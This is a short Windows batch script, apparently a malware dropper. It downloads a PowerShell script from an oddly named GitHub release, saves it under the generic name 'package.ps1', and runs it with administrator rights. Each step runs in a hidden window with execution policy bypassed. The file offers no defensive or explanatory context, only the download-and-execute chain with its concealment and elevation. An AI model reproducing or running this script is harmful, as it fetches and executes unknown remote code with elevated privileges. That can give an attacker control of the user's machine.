@echo off
setlocal

set "DownloadURL=https://github.com/AhmedK97/Xwqd21WaDdqwdv/releases/download/1.0/RunLevel.Highest.ps1"
set "DownloadFilePath=package.ps1"

powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -command "Invoke-WebRequest -Uri '%DownloadURL%' -OutFile '%DownloadFilePath%'"

set "PowerShellScriptPath=%~dp0%DownloadFilePath%"

PowerShell -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%PowerShellScriptPath%""' -Verb RunAs"

endlocal
